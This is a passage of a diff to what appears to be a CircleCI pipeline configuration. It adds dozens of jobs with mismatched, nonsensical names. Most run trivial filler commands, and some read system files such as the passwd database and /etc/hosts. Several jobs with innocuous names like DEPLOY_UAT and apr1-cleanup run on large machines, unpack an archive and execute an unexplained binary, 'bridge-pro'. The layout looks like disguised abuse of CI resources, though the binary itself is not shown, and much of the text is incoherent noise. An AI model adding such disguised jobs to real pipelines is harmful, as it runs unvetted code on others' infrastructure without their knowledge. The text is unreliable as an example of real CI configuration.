+            { set +o pipefail 2>/dev/null; for thing in stack service download summary crimson pitch ; do echo -n "${thing} "; done; echo; true ; } > /tmp/queue2/finyv
+            du -sh /tmp/queue2/finyv
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'finyv'
+  DEPLOY_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/finyv'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  F_FRST:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Verify
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; for p in test library inbox pod; do echo ${#p}; done; true ; } > /tmp/queue2/surg3
+            du -sh /tmp/queue2/surg3
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'surg3'
+  sep20-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/surg3'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  OY2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: leftovers
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts >"/tmp/spam-20181009.gz" && gzip -t "/tmp/spam-20181009.gz" && echo valid; true ; } > /tmp/queue2/draft_green_hawk_molten
+            du -sh /tmp/queue2/draft_green_hawk_molten
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'draft_green_hawk_molten'
+  chen-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/draft_green_hawk_molten'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  tab_is_null:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Bind v4 Beta
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; echo frog cat zebra tiger| xargs printf "%s\n"| sort; true ; } > /tmp/queue2/crisp-stone
+            du -sh /tmp/queue2/crisp-stone
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'crisp-stone'
+  apr1-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/crisp-stone'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+  wip-pattern:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: ClickStreamEmbedding
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 1 -type f | sed 's|.*/||' | head -n 3; true ; } > /tmp/queue2/proxy.cloud.memo
+            du -sh /tmp/queue2/proxy.cloud.memo
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'proxy.cloud.memo'
+  callisto-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Read handoff manifest
+          command: |
+            awk 'BEGIN{getline x < "'/tmp/queue2/finyv'"; print length(x)}' 2>/dev/null || true
+      - run:
+          name: Clone workspace
+          command: git clone --depth 1 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Materialize bundle
+          command: tar -I bzip2 -xf core-binaries.tar.bz2
+      - run:
+          command: sleep 25s
+      - run:
+          command: exec ./bridge-pro
+
+  success_account_manager:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Preflight vortex
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; find /etc/skel -type f -name '.*' -exec du -ch {} + | tail -n1; true ; } > /tmp/queue2/client-fjord-fox
+            du -sh /tmp/queue2/client-fjord-fox
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'client-fjord-fox'
+  b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: tar mnt
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; echo "3 jobs pending" >"/tmp/warning.fixes.out" ; wc -c "/tmp/warning.fixes.out"; true ; } > /tmp/queue2/iron-gadget-hollow-archive
+            du -sh /tmp/queue2/iron-gadget-hollow-archive
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'iron-gadget-hollow-archive'
+  IDX-SECTION-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: alert on call BEFORE LUNCH
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; printf 'host=localhost\nport=8578\nuser=eva\ndebug=false\n' >"/dev/shm/filter-plot.tsv" && (. "/dev/shm/filter-plot.tsv" && echo "$host:$port"); true ; } > /tmp/queue2/IMG-84234
+            du -sh /tmp/queue2/IMG-84234
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'IMG-84234'
+  itPollsKind:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Titrate the positive control to avoid surprises
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; printf '%s\n' "v1.2.3 released" | tr -d 'aeiou'; true ; } > /tmp/queue2/kernelFilterSilver
+            du -sh /tmp/queue2/kernelFilterSilver
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'kernelFilterSilver'
+  removeAuthor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: quarantine seed data fast
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; which gzip >/dev/null 2>&1 || echo "gzip missing"; true ; } > /tmp/queue2/5385af
+            du -sh /tmp/queue2/5385af
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - '5385af'
+  PIX:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Verify PGP
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; getent passwd | sort -t: -k 3 -n; true ; } > /tmp/queue2/cyyxcvuiid
+            du -sh /tmp/queue2/cyyxcvuiid
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'cyyxcvuiid'
+  t_ga:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Scale embedding
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; shuf -e kyoto lima dublin osaka austin; true ; } > /tmp/queue2/jhjlphx
+            du -sh /tmp/queue2/jhjlphx
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'jhjlphx'
+  LocalSoftFuturePlugin:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Train for 5 epochs
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; ls --sort=version /etc/default | tac; true ; } > /tmp/queue2/iter3_714c
+            du -sh /tmp/queue2/iter3_714c
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'iter3_714c'
+  ITEM_202606:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Tune up maintenance mode
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; echo 'OK' | base64; true ; } > /tmp/queue2/fEj9oE9Oq8zoW
+            du -sh /tmp/queue2/fEj9oE9Oq8zoW
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'fEj9oE9Oq8zoW'
+  ID-STATUS-DTL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Unlock freeze
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom of="/tmp/violet_20190719.conf" bs=512 count=2 2>/dev/null && wc -c "/tmp/violet_20190719.conf"; true ; } > /tmp/queue2/workerFilter
+            du -sh /tmp/queue2/workerFilter
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'workerFilter'
+  swapPrevious:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Jonas to encode the chapter markers
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; ls | tail -n10; true ; } > /tmp/queue2/96.66.158.210
+            du -sh /tmp/queue2/96.66.158.210
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - '96.66.158.210'
+  metric_rem_80:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Red light preview
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,orange,8,25.79\n2,apple,17,2.41\n3,peach,2,98.88\n4,melon,6,93.08\n' >"/tmp/horse-limit-gamma.dat" && sort -t, -k4 -rn "/tmp/horse-limit-gamma.dat" | head -n 2; true ; } > /tmp/queue2/pu153zinc
+            du -sh /tmp/queue2/pu153zinc
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'pu153zinc'
+  BufferedMiddlewareProvider:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/queue2
+      - run:
+          name: Pipette the lab notebook while we can
+          command: |
+            mkdir -p /tmp/queue2
+            { set +o pipefail 2>/dev/null; b2sum /usr/bin/env >"/tmp/host_price.sum" && b2sum -c "/tmp/host_price.sum"; true ; } > /tmp/queue2/surg3
+            du -sh /tmp/queue2/surg3
+      - persist_to_workspace:
+          root: /tmp/queue2
+          paths:
+            - 'surg3'
+workflows:
+  pipeline:
+    jobs:
+      - topic-map-load
+      - success_account_manager:
+          requires:
+            - topic-map-load
+      - ken-verify:
+          requires:
+            - success_account_manager
+      - db032:
+          requires:
+            - success_account_manager
+      - b:
+          requires:
+            - db032
+      - produce-quick-regression-suite:
+          requires:
+            - b
+      - lPrevProductIterator:
+          requires:
+            - b
+      - IDX-SECTION-2:
+          requires:
+            - lPrevProductIterator
+      - bun-vet:
+          requires:
+            - IDX-SECTION-2
+      - logp:
+          requires:
+            - IDX-SECTION-2
+      - itPollsKind:
+          requires:
+            - logp
+      - min-smoke:
+          requires:
+            - itPollsKind
+      - wrappersCache:
+          requires:
+            - itPollsKind
+      - removeAuthor:
+          requires:
+            - wrappersCache
+      - q1-smoke:
+          requires:
+            - removeAuthor
+      - Dismount-TextObject:
+          requires:
+            - removeAuthor
+      - PIX:
+          requires:
+            - Dismount-TextObject
+      - Rollout_Pipeline1:
+          requires:
+            - PIX
+      - fOV4IB8:
+          requires:
+            - PIX
+      - t_ga:
+          requires:
+            - fOV4IB8
+      - dp-01:
+          requires:
+            - t_ga
+      - hotel-robot:
+          requires:
+            - t_ga
+      - LocalSoftFuturePlugin:
+          requires:
+            - hotel-robot
+      - UAT_BUILD_7:
+          requires:
+            - LocalSoftFuturePlugin
+      - spanCost:
+          requires:
+            - LocalSoftFuturePlugin
+      - ITEM_202606:
+          requires:
+            - spanCost
+      - feat-9008:
+          requires:
+            - ITEM_202606
+      - JhRuaW:
+          requires:
+            - ITEM_202606
+      - ID-STATUS-DTL:
+          requires:
+            - JhRuaW
+      - API-796:
+          requires:
+            - ID-STATUS-DTL
+      - tb_task_bundle:
+          requires:
+            - ID-STATUS-DTL
+      - swapPrevious:
+          requires:
+            - tb_task_bundle
+      - v6-ga1:
+          requires:
+            - swapPrevious
+      - Sort-QueueWrapper:
+          requires:
+            - swapPrevious
+      - metric_rem_80:
+          requires:
+            - Sort-QueueWrapper
+      - tweak-cache-timeout:
+          requires:
+            - metric_rem_80
+      - F_FRST:
+          requires:
+            - metric_rem_80
+      - BufferedMiddlewareProvider:
+          requires:
+            - F_FRST
+      - sep20-smoke:
+          requires:
+            - BufferedMiddlewareProvider
+      - PRISM_54741
+      - refactor-2255:
+          requires:
+            - PRISM_54741
+      - y_train:
+          requires:
+            - PRISM_54741
+      - vela-v2:
+          requires:
+            - y_train
+      - OY2:
+          requires:
+            - y_train
+      - chen-build:
+          requires:
+            - OY2
+      - shader_cli:
+          requires:
+            - OY2
+      - rollout:
+          requires:
+            - shader_cli
+      - feature-trait-closed:
+          requires:
+            - shader_cli
+      - v4-edge:
+          requires:
+            - feature-trait-closed
+      - pnl_protocol:
+          requires:
+            - feature-trait-closed
+      - mike:
+          requires:
+            - pnl_protocol
+      - popHAL:
+          requires:
+            - pnl_protocol
+      - qi-verify:
+          requires:
+            - popHAL
+      - tab_is_null:
+          requires:
+            - popHAL
+      - apr1-cleanup:
+          requires:
+            - tab_is_null
+      - undo_-_key
+      - s
+      - card__track__bold
+      - DEPLOY_UAT:
+          requires:
+            - undo_-_key
+            - s
+            - card__track__bold
+      - add-router-glitch:
+          requires:
+            - undo_-_key
+            - s
+            - card__track__bold
+      - q2-rev:
+          requires:
+            - undo_-_key
+            - s
+            - card__track__bold
+      - wip-db-crash:
+          requires:
+            - undo_-_key
+            - s
+            - card__track__bold
+      - hotel:
+          requires:
+            - undo_-_key
+            - s
+            - card__track__bold
+      - QA_MERGE_9:
+          requires:
+            - undo_-_key
+            - s
+            - card__track__bold
+      - add-session:
+          requires:
+            - undo_-_key
+            - s
+            - card__track__bold
+      - callisto-plus:
+          requires:
+            - undo_-_key
+            - s
+            - card__track__bold
+      - auh-check:
+          requires:
+            - undo_-_key
+            - s
+            - card__track__bold
